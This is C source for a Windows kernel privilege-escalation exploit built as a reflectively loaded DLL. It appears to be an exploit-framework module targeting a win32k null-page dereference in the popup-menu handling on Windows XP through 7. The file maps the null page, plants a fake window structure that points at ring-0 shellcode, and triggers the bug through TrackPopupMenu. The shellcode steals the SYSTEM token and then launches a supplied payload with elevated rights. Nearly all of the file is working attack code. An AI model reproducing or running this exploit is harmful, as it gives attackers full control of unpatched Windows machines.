#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// Purloined from ntstatus.h
#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth

#define WIN32_NO_STATUS
#include <windows.h>
#undef WIN32_NO_STATUS

#ifndef _NTDEF_
typedef __success(return >= 0) LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif

#define DEBUGGING FALSE

#ifdef _M_X64
typedef unsigned __int64 QWORD;
typedef QWORD *PQWORD;
#endif

int WndProcClue = 0;
int HookCallbackClue = 0;
WNDPROC lpPrevWndFunc;
DWORD MyProcessId = 0;
DWORD OffsetWindows = 0;

typedef NTSTATUS(NTAPI *lNtAllocateVirtualMemory)(
	IN  HANDLE  ProcessHandle,
	IN  PVOID   *BaseAddress,
	IN  PULONG  ZeroBits,
	IN  PSIZE_T RegionSize,
	IN  ULONG   AllocationType,
	IN  ULONG   Protect
	);

typedef NTSTATUS(NTAPI *lPsLookupProcessByProcessId)(
	IN   HANDLE ProcessId,
	OUT  PVOID Process
	);

typedef NTSTATUS(NTAPI *lZwQuerySystemInformation)(
	_In_       DWORD SystemInformationClass,
	_Inout_    PVOID SystemInformation,
	_In_       ULONG SystemInformationLength,
	_Out_opt_  PULONG ReturnLength
	);

typedef struct _SYSTEM_MODULE {
	HANDLE               Reserved1;
	PVOID                Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	USHORT               Id;
	USHORT               Rank;
	USHORT               w018;
	USHORT               NameOffset;
	BYTE                 Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;


typedef struct _SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[0];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

lPsLookupProcessByProcessId pPsLookupProcessByProcessId = NULL;
lNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;


long CALLBACK HookCallbackTwo(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
	EndMenu();
	return -5;
}

LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) {
#ifdef _M_X64
	if (*(DWORD *)(lParam + 16) == 0x1EB && !HookCallbackClue)
#else
	if (*(DWORD *)(lParam + 8) == 0x1EB && !HookCallbackClue)
#endif
	{
		HookCallbackClue = 1;
		if (UnhookWindowsHook(WH_CALLWNDPROC, HookCallback)) {
#ifdef _M_X64
			lpPrevWndFunc = (WNDPROC)SetWindowLongPtr(*(HWND *)(lParam + 24), GWLP_WNDPROC, (ULONG_PTR)HookCallbackTwo);
#else
			lpPrevWndFunc = (WNDPROC)SetWindowLongA(*(HWND *)(lParam + 12), GWLP_WNDPROC, (LONG)HookCallbackTwo);
#endif
		}
	}
	return CallNextHookEx(0, code, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
	if (msg == 289 && WndProcClue != 1) {
		WndProcClue = 1;
		PostMessageA(hwnd, 256, 40, 0);
		PostMessageA(hwnd, 256, 39, 0);
		PostMessageA(hwnd, 513, 0, 0);
	}
	return DefWindowProc(hwnd, msg, wParam, lParam);
}

#ifdef _M_X64
QWORD MyPtiCurrent(void) {
	void *teb = (void *)__readgsqword(0x30);
	QWORD Win32ThreadInfo = (QWORD)*((PQWORD)((PBYTE)teb + 0x78));

	return Win32ThreadInfo;
}
#else
DWORD __stdcall MyPtiCurrent() {
	__asm {
		mov eax, fs : 18h
			mov eax, [eax + 40h]
	}
}
#endif

int _stdcall shellcode_ring0(int one, int two, int three, int four) {
	void *my_process_info = NULL;
	void *system_info = NULL;

	pPsLookupProcessByProcessId((HANDLE)MyProcessId, &my_process_info);
	pPsLookupProcessByProcessId((HANDLE)4, &system_info);

	*(PDWORD)((PBYTE)my_process_info + OffsetWindows) = *(PDWORD)((PBYTE)system_info + OffsetWindows);

	return 0;
}

void
LogMessage(char* pszFormat, ...) {
	if (DEBUGGING != TRUE) {
		return;
	}
	static char s_acBuf[2048];
	va_list args;
	va_start(args, pszFormat);
	vsprintf(s_acBuf, pszFormat, args);
	printf("%s\n", s_acBuf);
	OutputDebugString(s_acBuf);
	va_end(args);
}

DWORD WINAPI ExecutePayload(LPVOID lpPayload) {
	VOID(*lpCode)() = (VOID(*)())lpPayload;
	lpCode();
	return ERROR_SUCCESS;
}

void Win32kNullPage(LPVOID lpPayload) {
	HWND hWnd;
	WNDCLASSA WndClass;
	LPBYTE promise_land = NULL;
	HMODULE hNtdll = NULL;
	HMODULE ntkrnl = NULL;
	NTSTATUS status;
	PULONG pSystemInfoBuffer = NULL;
	lZwQuerySystemInformation pZwQuerySystemInformation = NULL;
	ULONG    SystemInfoBufferSize = 0;
	char nt_name[256];
	PVOID nt_base;
	OSVERSIONINFOA VersionInformation;

	// Getting Windows version
	LogMessage("[*] Getting Windows version...");
	memset(&VersionInformation, 0, sizeof(OSVERSIONINFOA));
	VersionInformation.dwOSVersionInfoSize = 148;
	if (!GetVersionExA(&VersionInformation)) {
		LogMessage("[!] Failed to get windows version");
		return;
	}

#ifdef _M_X64
	if (VersionInformation.dwMajorVersion == 6 && VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows 7 SP1
		LogMessage("[*] Windows 6.1 found...");
		OffsetWindows = 0x208;
	}
#else
	if (VersionInformation.dwMajorVersion == 6) {
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows 7 SP1
			LogMessage("[*] Windows 6.1 found...");
			OffsetWindows = 0xf8;
		}
		else if (!VersionInformation.dwMinorVersion) {
			LogMessage("[*] Windows 6.0 found..."); // Ex: Windows 2008 R2
			OffsetWindows = 0xe0;
		}
		else {
			LogMessage("[!] Unsupported Windows 6.%d found, only 6.0 and 6.1 supported atm", VersionInformation.dwMinorVersion);
			return;
		}
	}
	else if (VersionInformation.dwMajorVersion == 5) {
		if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 1) { // Ex: Windows XP SP3
			LogMessage("[*] Windows 5.1 found...");
			OffsetWindows = 0xc8;
		}
		else if (VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion == 2) { // Ex: Windows 2003 SP2
			LogMessage("[*] Windows 5.2 found...");
			OffsetWindows = 0xd8;
		}
		else {
			LogMessage("[!] Unsupported Windows 5  found, only 5.1 and 5.2 supported atm");
			return;
		}
	}
#endif
	else {
		LogMessage("[!] Major Version %d found, not supported", VersionInformation.dwMajorVersion);
		return;
	}

	// Solve symbols
	LogMessage("[*] Solving symbols...");

	hNtdll = LoadLibraryA("ntdll");
	if (hNtdll == NULL) {
		LogMessage("[!] Failed to Load ntdll...");
		return;
	}

	pZwQuerySystemInformation = (lZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (pZwQuerySystemInformation == NULL) {
		LogMessage("[!] Failed to solve ZwQuerySystemInformation");
		return;
	}

	pNtAllocateVirtualMemory = (lNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (pNtAllocateVirtualMemory == NULL) {
		LogMessage("[!] Failed to solve NtAllocateVirtualMemory");
		return;
	}

	LogMessage("[*] Requesting Kernel loaded modules...");

	status = pZwQuerySystemInformation(11, &SystemInfoBufferSize, 0, &SystemInfoBufferSize);

	if (SystemInfoBufferSize == 0) {
		LogMessage("[!] Requesting pZwQuerySystemInformation required length failed");
		return;
	}
	else {
		LogMessage("[*] pZwQuerySystemInformation required length %d", SystemInfoBufferSize);
	}

	pSystemInfoBuffer = (PULONG)LocalAlloc(LMEM_ZEROINIT, SystemInfoBufferSize);
	if (pSystemInfoBuffer == NULL) {
		LogMessage("[!] Allocation for SystemInfo failed");
		return;
	}

	status = pZwQuerySystemInformation(11, pSystemInfoBuffer, SystemInfoBufferSize, &SystemInfoBufferSize);

	if (status != STATUS_SUCCESS) {
		LogMessage("[!] Requesting kernel modules through ZwQuerySystemInformation failed");
		return;
	}


	LogMessage("[*] Parsing SYSTEM_INFO...");

	SYSTEM_MODULE_INFORMATION *smi = (SYSTEM_MODULE_INFORMATION *)pSystemInfoBuffer;

	LogMessage("[*] %d Kernel modules found\n", smi->ModulesCount);

	memset(nt_name, 0, 256);

	int i = 0;
	while (i < smi->ModulesCount) {
		SYSTEM_MODULE *sm = (SYSTEM_MODULE *)(smi->Modules + i);
		LogMessage("[*] Checking module %s", sm->Name);
		if (strstr((char *)sm->Name, ".exe")) {
			char *start = strstr((char *)sm->Name, "nt");
			if (start != NULL) {
				nt_base = sm->ImageBaseAddress;
				strncpy_s(nt_name, 256, start, _TRUNCATE);
				break;
			}
		}
		i++;
	}

	if (nt_name == NULL) {
		LogMessage("[!] nt not found");
		return;
	}
	else {
		LogMessage("[*] Good! nt found as %s at 0x%08x", nt_name, nt_base);
	}

	ntkrnl = LoadLibraryA(nt_name);

	LogMessage("[*] %s loaded in userspace at: %08x\n", nt_name, ntkrnl);

	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)GetProcAddress(ntkrnl, "PsLookupProcessByProcessId");

	if (pPsLookupProcessByProcessId == NULL) {
		LogMessage("[!] Failed to solve PsLookupProcessByProcessId\n");
		return;
	}

#ifdef _M_X64
	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((QWORD)nt_base + ((QWORD)pPsLookupProcessByProcessId - (QWORD)ntkrnl));
	LogMessage("[*] pPsLookupProcessByProcessId in kernel: %016llx\n", pPsLookupProcessByProcessId);
#else
	pPsLookupProcessByProcessId = (lPsLookupProcessByProcessId)((DWORD)nt_base + ((DWORD)pPsLookupProcessByProcessId - (DWORD)ntkrnl));
	LogMessage("[*] pPsLookupProcessByProcessId in kernel: %08x\n", pPsLookupProcessByProcessId);
#endif

	MyProcessId = GetCurrentProcessId();

	// Register Class
	LogMessage("[*] Registering class...");

	memset(&WndClass, 0, sizeof(WNDCLASSA));
	WndClass.lpfnWndProc = WndProc; // Called with CallWindowProc => http://msdn.microsoft.com/en-us/library/windows/desktop/ms633571(v=vs.85).aspx
	WndClass.lpszClassName = "woqunimalegebi";

	if (RegisterClassA(&WndClass) == 0) {
		LogMessage("[!] RegisterClassA failed ");
		return;
	}

	// Create Window
	LogMessage("[*] Creating window...");
	hWnd = CreateWindowExA(0, "woqunimalegebi", NULL, 0, -1, -1, 0, 0, NULL, NULL, NULL, NULL);

	if (hWnd == NULL) {
		LogMessage("[!] CreateWindowExA failed");
		return;
	}

	// Making everything ready for exploitation...

	LogMessage("[*] Allocating null page...");
#ifdef _M_X64
	ULONGLONG base_address = 0x00000000fffffffb;
#else
	DWORD base_address = 1;
#endif
	SIZE_T region_size = 0x1000;
	ULONG zero_bits = 0;
	HANDLE current_process = NULL;

	current_process = GetCurrentProcess();

	if (pNtAllocateVirtualMemory(current_process, (LPVOID*)(&base_address), 0, &region_size, (MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN), PAGE_EXECUTE_READWRITE) != STATUS_SUCCESS) {
		LogMessage("[!] Failed to allocate null page");
		return;
	}

	LogMessage("[*] Getting PtiCurrent...");

#ifdef _M_X64
	ULONGLONG pti = MyPtiCurrent();
#else
	DWORD pti = MyPtiCurrent();
#endif

	if (pti == 0) {
		LoadLibrary("user32.dll");
		LoadLibrary("gdi32.dll");
		pti = MyPtiCurrent();
	}

	if (pti == 0) {
		LogMessage("[!] Filed to get PtiCurrent");
		return;
	}
	else {
#ifdef _M_X64
		LogMessage("[*] Good! pti 0x%016llx", pti);
#else
		LogMessage("[*] Good! pti 0x%08x", pti);
#endif
	}

	LogMessage("[*] Creating a fake structure at NULL...");

#ifdef _M_X64
	void *test = NULL;
	(QWORD)test = 0x10000000B;
	*((PQWORD)test) = pti;

	/* win32k!tagWND->bServerSideWindowProc = TRUE */
	(QWORD)test = 0x100000025;
	*((PBYTE)test) = 4;

	/* win32k!tagWND->lpfnWndProc = &shellcode_ring0 */
	(QWORD)test = 0x10000008B;
	*((PQWORD)test) = &shellcode_ring0;
#else
	void *test = promise_land + 3;
	/* We need to save this check, otherwise unmapped memory will be dereferenced (blue screen)
	.text:BF8B93F4 02C mov     edi, _gptiCurrent
	.text:BF8B93FA 02C cmp     edi, [esi + 8];
	.text:BF8B93FD 02C jz      loc_BF8B
	*/
	*(LPDWORD)test = pti;

	*((LPBYTE)(promise_land + 0x11)) = 0x4;

	test = promise_land + 0x5b;
	*(LPDWORD)test = (DWORD)shellcode_ring0;
#endif

	// Exploit!

	LogMessage("[*] Triggering vulnerability...");
	HMENU MenuOne = CreatePopupMenu();
	if (MenuOne == NULL) {
		LogMessage("[!] First CreatePopupMenu failed");
		return;
	}

	MENUITEMINFOA MenuOneInfo;
	memset(&MenuOneInfo, 0, sizeof(MENUITEMINFOA));
	MenuOneInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuOneInfo.fMask = MIIM_STRING;

	if (InsertMenuItemA(MenuOne, 0, TRUE, &MenuOneInfo) != TRUE) {
		LogMessage("[!] First InsertMenuItemA failed");
		DestroyMenu(MenuOne);
		return;
	}

	HMENU MenuTwo = CreatePopupMenu();
	if (MenuTwo == NULL) {
		LogMessage("[!] Second CreatePopupMenu failed");
		DestroyMenu(MenuOne);
		return;
	}

	MENUITEMINFOA MenuTwoInfo;
	memset(&MenuTwoInfo, 0, sizeof(MENUITEMINFOA));
	MenuTwoInfo.cbSize = sizeof(MENUITEMINFOA);
	MenuTwoInfo.fMask = (MIIM_STRING | MIIM_SUBMENU);
	MenuTwoInfo.dwTypeData = "";
	MenuTwoInfo.cch = 1;
	MenuTwoInfo.hSubMenu = MenuOne;
	if (InsertMenuItemA(MenuTwo, 0, TRUE, &MenuTwoInfo) != TRUE) {
		LogMessage("[!] Second InsertMenuItemA failed");
		DestroyMenu(MenuTwo);
		DestroyMenu(MenuOne);
		return;
	}

	if (SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId()) == NULL) {
		LogMessage("[!] SetWindowsHookExA failed :-(\n");
		DestroyMenu(MenuTwo);
		DestroyMenu(MenuOne);
		return;
	}

	// 'crash' it!
	TrackPopupMenu(MenuTwo, 0, -10000, -10000, 0, hWnd, NULL);

	// If everything worked process should be privileges at this point
	LogMessage("[!] Executing payload...");
	CreateThread(0, 0, ExecutePayload, lpPayload, 0, NULL);
	return;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
	BOOL bReturnValue = TRUE;
	switch (dwReason) {
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL) {
			*(HMODULE *)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		Win32kNullPage(lpReserved);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
};
